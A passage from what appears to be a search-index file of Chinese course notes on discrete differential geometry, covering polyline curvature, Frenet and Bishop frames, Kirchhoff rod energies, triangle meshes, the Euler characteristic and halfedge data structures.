<p>\u4f7f\u7528\u6298\u7ebf\u6765\u8fd1\u4f3c\u5149\u6ed1\u66f2\u7ebf\u81ea\u7136\u4f1a\u5f15\u5165\u76f8\u5173\u95ee\u9898\uff0c\u4f8b\u5982\u539f\u672c\u6709\u826f\u597d\u5b9a\u4e49\u7684\u4e00\u4e9b\u51e0\u4f55\u91cf\u4f1a\u51fa\u73b0\u672a\u5b9a\u4e49\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06\u539f\u672c\u5149\u6ed1\u66f2\u7ebf\u4e0a\u7684\u5404\u79cd\u6982\u5ff5\u63a8\u5e7f\u5230\u79bb\u6563\u7684\u6298\u7ebf\u4e0a\u3002</p> <p>\u4e00\u79cd\u76f4\u89c2\u7684\u5904\u7406\u65b9\u6cd5\u662f\u4f7f\u7528\u6709\u9650\u5dee\u5206(finite difference)\u6765\u8fd1\u4f3c\u5fae\u5206\u3002\u4f46\u9057\u61be\u7684\u662f\u8fd9\u79cd\u79bb\u6563\u5dee\u5206\u7684\u5f62\u5f0f\u6709\u65f6\u4e5f\u662f\u4e0d\u53ef\u884c\u7684\u3002</p> <p>\u5b9e\u9645\u4e0a\u5f88\u591a\u5fae\u5206\u6027\u8d28\u90fd\u662f\u901a\u8fc7\u5dee\u5206\u53d6\u6781\u9650\u7684\u65b9\u5f0f\u63a8\u5bfc\u7684</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#signed-curvature-on-plane-curves","title":"Signed Curvature on Plane Curves","text":"<p>Discrete Gauss Map</p> <p>\u5148\u524d\u7684 Gauss Map \u5c06\u6cd5\u5411\u6620\u5c04\u4e3a\u5355\u4f4d\u5706\u4e0a\u7684\u70b9\uff0c\u800c\u5bf9\u4e8e Discrete Gauss Map\uff0c\u5b83\u5c06\u7ebf\u6bb5\u4e0a\u7684\u6cd5\u5411\u4ecd\u7136\u6620\u5c04\u4e3a\u70b9\uff0c\u800c\u9876\u70b9\u4e0a\u7684\u6cd5\u5411\u6620\u5c04\u4e3a\u76f8\u90bb\u4e24\u6bb5\u6cd5\u5411\u7684\u5939\u89d2\uff0c\u5373\u5706\u5f27\uff1a</p> <p></p> <p>Integrated Curvature</p> <p>\u6298\u7ebf\u5728\u9876\u70b9\u5904\u7684\u8f6c\u89d2 \\(\\theta\\) \u7b49\u4e8e\u66f2\u7387\u5728 dual cell \u4e0a\u7684\u79ef\u5206\u3002</p> <p>\u79bb\u6563\u5316\u8868\u793a\u66f2\u7ebf\u65f6\uff0c\u6211\u4eec\u6709\u4e00\u5957\u539f\u59cb\u5355\u5143(Primal Cell)\uff0c\u4f8b\u5982\u9876\u70b9\u3001\u8fb9\u7b49\uff0cDual Cell \u662f\u5b9a\u4e49\u5728\u5b83\u4eec\u4e0a\u7684\u5bf9\u5076\u7ed3\u6784</p> <p></p> <p>\u56e0\u6b64\u53ef\u4ee5\u8bf4\u66f2\u7387\u7684\u5927\u5c0f\u53d7\u5230\u4e86 dual cell \u7684\u957f\u5ea6\u5f71\u54cd\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u6298\u7ebf\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u7ebf\u6bb5\u4e0a\u7684\u66f2\u7387\u4e3a 0\uff0c\u9876\u70b9\u4e0a\u7684\u66f2\u7387\u4e3a \\(\\infty\\)</p> <p>\u7ed3\u5408\u5916\u89d2\u5b9a\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u51fa\u4e00\u6bb5\u5c01\u95ed\u6298\u7ebf\u5173\u4e8e\u5f27\u957f\u79ef\u5206\u7684\u548c\u4e3a\uff1a</p> <p></p> <p>First Variation Formula</p> <p>\u4e4b\u524d\u6211\u4eec\u5f97\u51fa\u7ed3\u8bba\u662f\u5c06\u8fde\u7eed\u66f2\u7ebf\u6cbf\u7740 \\(\\kappa \\mathbf{N}\\) \u65b9\u5411\u79fb\u52a8\u662f\u7f29\u77ed\u66f2\u7ebf\u957f\u5ea6\u7684\u6700\u5feb\u65b9\u5f0f\u3002</p> <p>\u800c\u5bf9\u4e8e\u79bb\u6563\u66f2\u7ebf\u5219\u53ef\u4ee5\u7c7b\u4f3c\u5730\u8bc1\u660e\u5c06\u9876\u70b9\u6cbf\u6cd5\u5411\u79fb\u52a8 \\(2 \\sin\\frac{\\theta}{2}\\) \u662f\u6539\u53d8\u66f2\u7ebf\u957f\u5ea6\u6700\u5feb\u7684\u65b9\u5f0f\uff0c\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u770b\u79bb\u6563\u66f2\u7387\u7684\u8868\u8fbe\u5f0f\u4e3a \\(\\kappa = 2 \\sin\\frac{\\theta}{2}\\)\u3002\u6ce8\u610f\u5230\u8fd9\u91cc\u79bb\u6563\u66f2\u7387\u7684\u8868\u8fbe\u5f0f\u4e0d\u540c\u4e8e\u524d\u9762\u63a8\u5bfc\u51fa\u7684\u7ed3\u679c\uff0c\u8fd9\u518d\u6b21\u8bf4\u660e\u79bb\u6563\u7684\u51e0\u4f55\u6982\u5ff5\u662f\u4e0d\u80fd\u4fdd\u8bc1\u5bf9\u4e8e\u6240\u6709\u7684\u60c5\u51b5\u90fd\u4e25\u683c\u6210\u7acb\u7684\u3002\u4e0d\u8fc7\u5f53 \\(\\theta\\) \u6bd4\u8f83\u5c0f\u65f6\u8fd9\u4e24\u79cd\u66f2\u7387\u7684\u5b9a\u4e49\u662f\u975e\u5e38\u63a5\u8fd1\u7684\u3002</p> <p></p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#discrete-differential-geometry","title":"Discrete Differential Geometry","text":""},{"location":"Accumulation/ShapeAnalysis/CH3/#curves-in-3d","title":"Curves in 3D","text":"<p>\u4e09\u7ef4\u7a7a\u95f4\u7684\u8fde\u7eed\u66f2\u7ebf\u9700\u8981\u6ee1\u8db3\u5982\u4e0b Frenet \u65b9\u7a0b\uff1a</p> \\[\\frac{d}{ds} \\begin{bmatrix} \\mathbf{T}(s) \\\\ \\mathbf{N}(s) \\\\ \\mathbf{B}(s) \\end{bmatrix} = \\begin{bmatrix} 0 &amp; \\kappa &amp; 0 \\\\ -\\kappa &amp; 0 &amp; \\tau \\\\ 0 &amp; -\\tau &amp; 0 \\end{bmatrix} \\begin{bmatrix} \\mathbf{T}(s) \\\\ \\mathbf{N}(s) \\\\ \\mathbf{B}(s) \\end{bmatrix}\\] <p>\u57fa\u4e8e\u8fd9\u4e2a\u516c\u5f0f\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u5f0f\u5bf9\u66f2\u7ebf\u8fdb\u884c\u79bb\u6563\u5316\uff1a</p> <ul> <li>&lt;1&gt; Frenet \u65b9\u7a0b\u79bb\u6563\u5316\uff1a\u6298\u7ebf\u7684\u65b9\u5411\u8fd1\u4f3c\u4e3a \\(T\\)<ul> <li>\\(T_j=\\frac{ p_{j+1} - p_j}{\\| p_{j+1} - p_j\\| _2 }\\)</li> <li>\\(B_j= T_{j-1} \\times T_j\\)</li> <li>\\(N_j = B_j\\times T_j\\)</li> </ul> </li> <li>&lt;2&gt; Transfer Matrix \u65b9\u6cd5\uff1a\u7528\u65cb\u8f6c\u77e9\u9635 \\(R_{i,j}\\) \u8868\u793a\u4ece\u4e00\u6bb5\u6298\u7ebf\u5230\u4e0b\u4e00\u6bb5\u6298\u7ebf\u7684\u53d8\u6362\uff0c\u662f\u6709\u9650\u7684\u4f20\u9012\u64cd\u4f5c<ul> <li>\\(\\begin{bmatrix} \\mathbf{T}_{i+1} \\\\ \\mathbf{N}_{i+1} \\\\ \\mathbf{B}_{i+1} \\end{bmatrix} = R_{i+1,j} \\begin{bmatrix} \\mathbf{T}_i \\\\ \\mathbf{N}_i \\\\ \\mathbf{B}_i \\end{bmatrix}\\)</li> </ul> </li> </ul>"},{"location":"Accumulation/ShapeAnalysis/CH3/#adapted-framed-curve","title":"Adapted Framed Curve","text":"<p>\u540c\u65f6\uff0c\u4ec5\u4ec5\u7528\u6298\u7ebf\u8fd1\u4f3c\u66f2\u7ebf\u662f\u4e0d\u591f\u7684\u3002 \u6bd4\u5982\u4e00\u6761\u201c\u7ed5\u7740\u5207\u5411\u91cf\u65cb\u8f6c\u201d\u7684\u87ba\u65cb\u66f2\u7ebf\uff0c\u5982\u679c\u53ea\u7528\u6298\u7ebf\uff0c\u6211\u4eec\u80fd\u8fd1\u4f3c\u51fa\u5b83\u7684\u5f2f\u66f2\uff0c\u4f46\u65e0\u6cd5\u8868\u8fbe\u66f2\u7ebf\u81ea\u8eab\u7684\u626d\u8f6c (twist)\u3002</p> <p>\u4e3a\u6b64\uff0c\u9700\u8981\u5f15\u5165\u4e00\u4e2a material frame\uff08\u6750\u6599\u6807\u67b6\uff09\uff1a</p> <ul> <li>\u5728\u5207\u5411\u91cf \\(\\mathbf{T}\\) \u7684\u5782\u76f4\u5e73\u9762\u4e0a\uff0c\u518d\u9009\u62e9\u4e24\u4e2a\u4e92\u76f8\u6b63\u4ea4\u7684\u5355\u4f4d\u5411\u91cf \\(\\mathbf{m}_1, \\mathbf{m}_2\\)\uff1b</li> <li>\u8fd9\u6837\u4e0d\u4ec5\u63cf\u8ff0\u4e86\u66f2\u7ebf\u7684\u5f62\u72b6\uff0c\u8fd8\u80fd\u6355\u6349\u5230\u201c\u7ed5\u7740\u5207\u7ebf\u65cb\u8f6c\u201d\u7684\u81ea\u7531\u5ea6\u3002</li> </ul> <p></p> <p>\u6709\u4e86 material frame\uff0c\u6211\u4eec\u5c31\u80fd\u5b9a\u4e49\uff1a</p> <ul> <li>\u5f2f\u66f2\u80fd\u91cf (bending energy)\uff1a\u7531\u5207\u5411\u7684\u53d8\u5316\u51b3\u5b9a\uff1b</li> <li>\u626d\u8f6c\u80fd\u91cf (twisting energy)\uff1a\u7531 material frame \u5728\u66f2\u7ebf\u4e0a\u7684\u65cb\u8f6c\u51b3\u5b9a\u3002</li> </ul> <p>\u8fd9\u4e3a\u6a21\u62df\u5f39\u6027\u66f2\u7ebf\uff08\u5982\u6a61\u76ae\u7b4b\uff09\u63d0\u4f9b\u4e86\u80fd\u91cf\u5f62\u5f0f</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#bishop-frame","title":"Bishop Frame","text":"<p>\u5728\u5b9e\u9645\u5e94\u7528 material frame \u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u65b9\u6cd5\u6765\u5b9a\u4e49\u548c\u4f20\u64ad \\(\\mathbf{m}_1, \\mathbf{m}_2\\)\u200b\u3002 \u8fd9\u5c31\u662f Bishop Frame\uff08\u5e73\u884c\u8fd0\u8f93\u6807\u67b6\uff09 \u7684\u601d\u60f3\uff1a</p> <ul> <li>\u5728\u8d77\u70b9\u9009\u62e9\u4efb\u610f\u4e00\u7ec4\u6b63\u4ea4\u5411\u91cf \\((\\mathbf{T}, \\mathbf{u}, \\mathbf{v})\\)\uff0c\u5176\u4e2d \\(\\mathbf{T}\\) \u662f\u5207\u5411\u91cf\uff1b</li> <li>\u6cbf\u66f2\u7ebf\u79fb\u52a8\u65f6\uff0c\u4e0d\u8ba9 \\(\\mathbf{u}, \\mathbf{v}\\) \u4ea7\u751f\u4e0d\u5fc5\u8981\u7684\u65cb\u8f6c\uff0c\u800c\u662f\u901a\u8fc7 \u5e73\u884c\u8fd0\u8f93 (parallel transport) \u6765\u4f20\u64ad\uff1b</li> <li>\u5e73\u884c\u8fd0\u8f93\u610f\u5473\u7740\uff1a\u6807\u67b6\u53d8\u5316\u65f6\uff0c\u5c3d\u91cf\u4fdd\u6301\u65cb\u8f6c\u6700\u5c0f\uff0c\u53ea\u53d7\u66f2\u7387\u65b9\u5411\u5f71\u54cd\u3002</li> </ul> <p>\u53ef\u4ee5\u8bc1\u660e\uff0cBishop frame \u7684\u53d8\u5316\u7531 Darboux vector \u63a7\u5236\uff1a</p> \\[\\Omega = \\kappa \\mathbf{B}\\] <p>\u901a\u8fc7\u5fae\u5206\u65b9\u7a0b\u6765\u5f97\u5230\u6574\u4e2a\u66f2\u7ebf\u4e0a\u7684\u6807\u67b6\u3002</p> <p>\u6709\u4e86 Bishop frame\uff0c\u5c31\u80fd\u81ea\u7136\u5b9a\u4e49 material frame \u7684\u65cb\u8f6c\u89d2\uff0c\u4ece\u800c\u7ed9\u51fa \u626d\u8f6c\u80fd\u91cf \u7684\u8868\u8fbe\u5f0f\u3002</p> \\[ \\begin{array}l \\mathbf{m}_1 = \\mathbf{u} \\cos \\theta + \\mathbf{v}\\sin \\theta \\\\ \\mathbf{m}_2= - \\mathbf{u}\\sin \\theta + \\mathbf{v} \\cos \\theta \\end{array} \\]"},{"location":"Accumulation/ShapeAnalysis/CH3/#discrete-kirchoff-rod","title":"Discrete Kirchoff Rod","text":"<p>\u4e3a\u4e86\u5bf9\u5f39\u6027\u66f2\u7ebf\u8fdb\u884c\u79bb\u6563\uff0c\u6211\u4eec\u4f7f\u7528\u6298\u7ebf\u6765\u8fd1\u4f3c\u3002</p> <ul> <li>\u6298\u7ebf\u7684\u5207\u5411\uff1a<ul> <li>$\\(\\mathbf{T}_i = \\frac{e_i}{\\|e_i\\|}, \\quad e_i = \\mathbf{x}_{i+1} - \\mathbf{x}_i\\)$\u200b</li> </ul> </li> <li>\u79bb\u6563\u66f2\u7387\u7684\u5b9a\u4e49\uff1a<ul> <li> \\[\\kappa := 2\\tan\\left(\\frac{\\theta}{2}\\right), \\quad \\theta = \\arccos(\\mathbf{T}_i \\cdot \\mathbf{T}_{i+1})\\] </li> <li>\u8fd9\u91cc \\(\\theta\\) \u662f\u76f8\u90bb\u5207\u5411\u4e4b\u95f4\u7684\u8f6c\u89d2\u3002</li> </ul> </li> </ul> <p>\u57fa\u4e8e\u8fd9\u4e2a\u5b9a\u4e49\uff0c\u53ef\u4ee5\u63a8\u51fa\u79bb\u6563 Darboux vector\uff1a \u5b83\u5305\u542b\u4e86\u79bb\u6563\u7684\u66f2\u7387\u4e0e\u6320\u7387\uff0c\u8868\u793a\u6298\u7ebf\u6bb5\u4e4b\u95f4\u7684\u65cb\u8f6c\u5173\u7cfb\u3002</p> <p>\u8fdb\u800c\uff0c\u80fd\u91cf\u53ef\u4ee5\u5199\u6210\u79bb\u6563\u5f62\u5f0f\uff1a</p> \\[\\begin{array}l E_\\text{bend} = \\alpha \\sum_i \\frac{\\| (\\kappa B)_i \\|^2_2}{l_i} \\\\ E_\\text{twist} = \\beta \\sum_i \\frac{(\\theta^i - \\theta^{i-1}) ^2}{ l_i} \\end{array} \\]"},{"location":"Accumulation/ShapeAnalysis/CH4/","title":"Surfaces","text":""},{"location":"Accumulation/ShapeAnalysis/CH4/#surface","title":"Surface","text":"<p> \u7ea6 1520 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/ShapeAnalysis/CH4/#smooth-discrete-surface","title":"Smooth &amp; Discrete Surface","text":""},{"location":"Accumulation/ShapeAnalysis/CH4/#theoretical-definition","title":"Theoretical Definition","text":"<p>\u7b80\u5355\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u66f2\u9762\u662f\u4e00\u4e2a\u4e8c\u7ef4\u5e73\u9762\u901a\u8fc7\u4e00\u4e2a\u53ef\u5fae\u6620\u5c04 \\(f\\) \u5d4c\u5165\u5230\u4e09\u7ef4\u7a7a\u95f4\u7684\u7ed3\u679c\uff1a</p> <p></p> <p>\u5f53 \\(Df\\) \u4e0d\u6ee1\u79e9\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u66f2\u9762\u9000\u5316\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u6c42\u66f2\u9762\u7684 Jacobian \u77e9\u9635\u5fc5\u987b\u6ee1\u8db3\u6ee1\u79e9\u7684\u6761\u4ef6\u3002</p> <p>Jacobian Matrix</p> \\[\\begin{array}c f:\\ \\mathbb R^m \\rightarrow \\mathbb R^n \\\\ (Df)_j^i = \\left ( \\frac{\\partial f^i}{\\partial x^j} \\right ) \\end{array}\\] <p>\u5c31\u548c\u66f2\u7ebf\u4e00\u6837\uff0c\u6211\u4eec\u540c\u6837\u8ba4\u4e3a\u66f2\u9762\u4e5f\u662f\u4e00\u4e2a\u5177\u6709\u7279\u5b9a\u5c5e\u6027\u7684\u70b9\u96c6\u5408\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2a function\u3002</p> <p>\u6211\u4eec\u8ba4\u4e3a\u66f2\u9762\u672c\u8eab\u662f\u4e00\u4e2a\u4e09\u7ef4\u7a7a\u95f4\u4e2d\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u5728\u66f2\u9762\u4e0a\u7684\u6bcf\u4e00\u70b9\u7684\u5c40\u90e8\u4e0a\u4ecd\u7136\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7684\u5e73\u9762\u3002\u8fd9\u4e2a\u5e73\u9762\u88ab\u79f0\u4e3a\u5207\u7a7a\u95f4(tangent space)\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u66f2\u7ebf\u7684\u89d2\u5ea6\u6765\u7406\u89e3\u5207\u7a7a\u95f4\u3002\u5bf9\u4e8e\u66f2\u9762\u4e0a\u7ecf\u8fc7 \\(\\mathbf{p}\\) \u70b9\u7684\u66f2\u7ebf \\(\\gamma\\)\uff0c\u6211\u4eec\u5b9a\u4e49 \\(\\mathbf{p}\\) \u70b9\u7684\u5207\u7a7a\u95f4\u4e3a\u6ee1\u8db3 \\(\\gamma(0)=\\mathbf{p}\\) \u7684\u6240\u6709\u66f2\u7ebf\u5728\u8be5\u5904\u5207\u5411\u91cf\u7684\u96c6\u5408\u3002</p> <p>\u800c\u5982\u679c\u4ece\u5fae\u5206\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5207\u7a7a\u95f4\u53ef\u4ee5\u8ba4\u4e3a\u662f\u5c40\u90e8\u53c2\u6570\u5316\u7684\u5bf9\u8c61\u3002\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e24\u79cd\u5b9a\u4e49\u90fd\u662f\u7b49\u4ef7\u7684\u3002</p> <p></p> \u5728\u5207\u7a7a\u95f4\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u5b9a\u4e49 normal space\uff0c\u5b83\u662f\u5782\u76f4\u4e8e\u5207\u5e73\u9762\u6cd5\u5411\u91cf\u7684\u96c6\u5408 <p></p>"},{"location":"Accumulation/ShapeAnalysis/CH4/#discrete-representations","title":"Discrete Representations","text":"<p>\u8ba1\u7b97\u673a\u4e2d\u8868\u793a\u66f2\u9762\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u4e09\u89d2\u5f62\u7f51\u683c\uff0c\u5373\u4f7f\u7528\u4e09\u89d2\u5f62\u6765\u8fd1\u4f3c\u5c40\u90e8\u7684\u66f2\u9762\uff1a</p> \\[ \\begin{array}l V= (v_1, v_2,..., v_n) \\subset \\mathbb R^3 \\\\ E= (e_1, e_2, ...,e_k) \\subseteq V\\times V \\\\ F=(f_1, f_2,..., f_m) \\subset V\\times V \\times V \\end{array} \\] <p>\u5b9e\u9645\u5e94\u7528\u4e2d\u53ef\u80fd\u4f1a\u6709\u975e\u6d41\u5f62\u7f51\u683c</p> <ul> <li>\u975e\u6d41\u5f62\u8fb9: \u4e00\u6761\u8fb9\u88ab\u4e09\u4e2a\u6216\u66f4\u591a\u9762\u5171\u4eab</li> <li>\u975e\u6d41\u5f62\u9876\u70b9: \u9876\u70b9\u5468\u56f4\u90bb\u57df\u4e0d\u80fd\u94fa\u6210\u62d3\u6251\u5706\u76d8<ul> <li>\u62d3\u6251\u5373\u9876\u70b9\u4e4b\u95f4\u7684\u8fde\u63a5\u5173\u7cfb</li> </ul> </li> </ul> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4e00\u4e2a\u6b63\u65b9\u4f53\u662f\u6d41\u5f62\u7f51\u683c\uff0c\u4f46\u662f\uff1a</p> <ul> <li>\u5982\u679c\u628a\u4e24\u4e2a\u7acb\u65b9\u4f53\u901a\u8fc7 \u4e00\u6761\u8fb9\u710a\u63a5\u5728\u4e00\u8d77 \u2192 \u8fd9\u4e2a\u5171\u4eab\u8fb9\u5c31\u662f \u975e\u6d41\u5f62\u8fb9\uff1b</li> <li>\u5982\u679c\u4e24\u4e2a\u7acb\u65b9\u4f53\u53ea\u901a\u8fc7 \u4e00\u4e2a\u9876\u70b9\u710a\u63a5 \u2192 \u8fd9\u4e2a\u70b9\u5c31\u662f \u975e\u6d41\u5f62\u9876\u70b9\u3002</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u628a\u7f51\u683c\u4e0a\u4efb\u610f\u9876\u70b9\u76f8\u8fde\u7684\u8fb9\u7684\u6570\u91cf\u79f0\u4e3a\u9876\u70b9\u7684 valence \u6216\u8005 degree\uff0c\u5229\u7528\u8fd9\u4e2a\u6982\u5ff5\u5c31\u53ef\u4ee5\u63cf\u8ff0\u7f51\u683c\u7684\u4e00\u4e9b\u62d3\u6251\u6027\u8d28\u3002</p> <p></p> <p>Euler Characteristic \\(\\chi\\) \u662f\u7f51\u683c\u91cd\u8981\u7684\u62d3\u6251\u6027\u8d28\uff0c\u6839\u636e\u6b27\u62c9\u516c\u5f0f\uff0c\u6211\u4eec\u6709\uff1a</p> \\[ V-E+F=\\chi,\\ \\ \\chi = 2-2g \\] <p>\u5176\u4e2d \\(g\\) \u79f0\u4e3a\u7f51\u683c\u7684\u4e8f\u683c\uff08genus\uff09\uff0c\u5b83\u53ef\u4ee5\u7406\u89e3\u4e3a\u66f2\u9762\u4e0a\u7684\u5b54\u6d1e\u6570\uff0c\u4f8b\u5982\u4e00\u4e2a\u5496\u5561\u676f\u7684\u4e8f\u683c \\(g=1\\)\uff0c\u5373\u5b83\u7684\u676f\u628a\u624b\u5904\u3002\u4e0a\u5f0f\u8bf4\u660e\u5bf9\u4e8e\u4efb\u610f\u5f62\u5f0f\u7684\u66f2\u9762\uff0c\u53ea\u8981\u5b83\u4eec\u5177\u6709\u76f8\u540c\u7684\u4e8f\u683c\u6570\uff0c\u7f51\u683c\u7684\u9876\u70b9\u6570\u3001\u8fb9\u6570\u4ee5\u53ca\u9762\u6570\u4e00\u5b9a\u6ee1\u8db3\u6b27\u62c9\u516c\u5f0f\u3002</p> <p>\u6ce8\u610f\u5230\u6ca1\u6709\u8fb9\u754c\u7684\u4e09\u89d2\u5f62\u7f51\u683c\uff0c\u6bcf\u6761\u8fb9\u90fd\u5bf9\u5e94\u4e24\u4e2a\u9762\uff0c\u6bcf\u4e2a\u9762\u5bf9\u5e94\u4e09\u6761\u8fb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u9762\u548c\u8fb9\u6570\u91cf\u4e0a\u7684\u5173\u7cfb\uff1a</p> \\[ 2E=3F \\] <p>\u6211\u4eec\u5c06\u5176\u4ee3\u5165\u6b27\u62c9\u516c\u5f0f\uff1a</p> \\[ V-E+F=V- \\frac{1}{2}F=\\chi  \\] <p>\u76f8\u6bd4\u4e8e\u8fb9\u6570\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7f51\u683c\u7684 \\(\\chi\\) \u90fd\u975e\u5e38\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8fd1\u4f3c\u5f97\u5230 \\(F \\approx 2V\\)\uff08\u7b49\u4ef7\u4e8e \\(E\\approx 3V\\)\uff09\u3002</p> <p>\u8fd9\u6837\u4f30\u8ba1\u4e0b\u6765\uff0c\u4e09\u89d2\u5f62\u7f51\u683c\u7684 average valence = 6</p> Other Representation <p>\u9664\u4e86\u4e09\u89d2\u7f51\u683c\u5916\uff0c\u5177\u4f53\u5e94\u7528\u4e2d\u6709\u975e\u5e38\u591a\u7684\u5907\u9009\u65b9\u6848\u3002\u50cf\u662f\u673a\u5668\u5b66\u4e60\u4e2d\u5e38\u89c1\u7684\u6709\u5411\u8ddd\u79bb\u573a(signed distance field, SDF)\u3001\u6d41\u4f53\u4eff\u771f\u4e2d\u5e38\u7528\u7684\u9690\u5f0f\u66f2\u9762(implicit surface)\u751a\u81f3\u70b9\u4e91\u7b49\u90fd\u53ef\u4ee5\u8868\u793a\u590d\u6742\u7684\u66f2\u9762\u3002</p>"},{"location":"Accumulation/ShapeAnalysis/CH4/#data-structure","title":"Data Structure","text":"<p>Triangle Soup</p> <p>\u6700\u76f4\u89c2\u7684\u8868\u793a\u65b9\u5f0f\u662f\u76f4\u63a5\u8bb0\u5f55 Mesh \u4e2d\u6bcf\u4e2a Face \u7684\u9876\u70b9\u5750\u6807\uff0c\u5f62\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>x1, y1, z1 / x2, y2, z2 / x3, y3, z3 \nx1, y1, z1 / x2, y2, z2 / x3, y3, z3\n...\n</code></pre> <p>\u8fd9\u5728\u65e9\u671f\u7684\u4e00\u4e9b\u56fe\u50cf\u5e93\uff0c\u4f8b\u5982 OpenGL \u4e2d\u6709\u6240\u4f7f\u7528\uff0c\u4f46\u662f\u8fd9\u6837\u53c8\u6d6a\u8d39\u7a7a\u95f4\u53c8\u65e0\u6cd5\u8f7b\u6613\u4ece\u4e2d\u83b7\u5f97\u66f2\u9762\u62d3\u6251\u6027\u8d28\uff0c\u56e0\u6b64\u51e0\u4e4e\u4e0d\u4f1a\u5728\u51e0\u4f55\u5904\u7406\u4e2d\u4f7f\u7528\u3002</p> <p>Shared Vertex Structure</p> <p>\u53e6\u4e00\u79cd\u5e38\u89c1\u65b9\u5f0f\u5206\u522b\u8bb0\u5f55\u9876\u70b9\u7684\u5750\u6807\u548c\u6bcf\u4e2a Face \u7684\u9876\u70b9\u7f16\u53f7\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9876\u70b9\u5750\u6807\u7684\u53cd\u590d\u8bb0\u5f55\uff1a</p> <pre><code>v 0.2 1.5 3.2\nv 5.2 4.1 8.9\n...\nf 1 5 3\nf 5 1 2\n...\n</code></pre> <p>\u4f8b\u5982 <code>.obj</code> \u683c\u5f0f\u5c31\u662f\u8fd9\u6837\u5b58\u50a8\u7684</p> <p>\u9057\u61be\u7684\u662f\u8fd9\u79cd\u65b9\u5f0f\u4ecd\u7136\u5bf9\u67d0\u4e9b\u51e0\u4f55\u5904\u7406\u4e0d\u53cb\u597d\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u8981\u5bf9\u7f51\u683c\u5e73\u6ed1\u6ee4\u6ce2\uff0c\u9700\u8981\u7528\u5230\u76f8\u90bb\u9876\u70b9\u7684\u5750\u6807\uff0c\u6b64\u65f6\u60f3\u8981\u76f4\u63a5\u83b7\u5f97\u76f8\u90bb\u9876\u70b9\u7684\u5750\u6807\u662f\u8f83\u4e3a\u56f0\u96be\u7684\u3002</p> <p>Halfedge Data Structure</p> <p>Complex data structures enable simpler traversal at cost of more bookkeeping.</p> <p>\u6211\u4eec\u9700\u8981\u8bbe\u8ba1\u4e00\u79cd\u5c40\u90e8\u6027\u826f\u597d\u7684\u6570\u636e\u7ed3\u6784\u6765\u65b9\u4fbf\u6211\u4eec\u67e5\u8be2\u3002</p> <p>Halfedge \u662f\u7f51\u683c\u5904\u7406\u4e2d\u975e\u5e38\u6d41\u884c\u7684\u6570\u636e\u7ed3\u6784\u3002\u6211\u4eec\u77e5\u9053\u4e00\u6761\u8fb9\u88ab\u4e24\u4e2a\u9762\u6240\u5360\u6709\uff0c\u56e0\u6b64\u534a\u8fb9\u6307\u7684\u662f\u5176\u5728\u5bf9\u5e94\u9762\u7684\u90e8\u5206\uff0c\u534a\u8fb9\u7684\u65b9\u5411\u5373\u4e3a\u8be5\u9762\u7684\u65b9\u5411\u3002</p> <p>\u5728\u6bcf\u4e2a\u9876\u70b9\u4e0a\u9700\u8981\u8bb0\u5f55\u6240\u6709\u4ee5\u8be5\u9876\u70b9\u4e3a\u8d77\u70b9\u7684\u534a\u8fb9\uff0c\u6bcf\u4e2a\u9762\u4e0a\u9700\u8981\u8bb0\u5f55\u6240\u6709\u4e0e\u8be5\u9762\u76f8\u90bb\u7684\u534a\u8fb9\uff0c\u800c\u6bcf\u6761\u534a\u8fb9\u81ea\u8eab\u8fd8\u9700\u8981\u8bb0\u5f55\u5b83\u7684\u53cd\u5411\u534a\u8fb9(flip)\u3001\u4e0b\u4e00\u6761\u534a\u8fb9(next)\u4ee5\u53ca\u534a\u8fb9\u81ea\u8eab\u7684\u8d77\u70b9\u548c\u6240\u5728\u9762\u7684\u7f16\u53f7\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u534a\u8fb9\u6570\u636e\u7ed3\u6784\u8fd8\u53ef\u4ee5\u65b9\u4fbf\u8f6c\u6362\u4e3a\u5bf9\u5076\u5f62\u5f0f\u3002\u5047\u8bbe\u6709\u4e00\u51fd\u6570 \\(f\\in \\mathbb R^{|V|}\\) \u5c06\u6bcf\u70b9\u6620\u5c04\u4e3a\u4e00\u4e2a\u5b9e\u6570\uff1a</p> <p></p> <p>\u90a3\u4e48\u5047\u5982\u6211\u4eec\u5e0c\u671b\u5bf9\u51fd\u6570 \\(f\\) \u505a\u79ef\u5206\uff0c\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u5b9a\u4e49\u88ab\u79ef\u5143\u7d20\uff1f</p> 